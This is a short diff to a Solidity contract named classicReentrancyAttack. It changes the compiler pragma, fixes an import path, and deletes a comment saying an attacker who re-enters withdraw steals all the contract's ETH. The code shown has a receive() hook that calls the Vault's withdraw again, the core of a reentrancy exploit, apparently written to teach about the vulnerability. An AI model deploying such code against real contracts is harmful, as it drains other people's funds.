@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity 0.8.25;
+pragma solidity ^0.8.0;
 
-import "./classicReentrancy.sol";
+import "./ClassicReentrancy.sol";
 
 contract classicReentrancyAttack {
     Vault vault;
@@ -22,7 +22,6 @@ contract classicReentrancyAttack {
 
     receive() external payable {
         uint256 balance = vault.balanceOf(address(this));
-        //If an attacker re-enters the withdraw function, they will steal all the ETH from the contract.
         try vault.withdraw(balance) {} catch {}
     }
 }
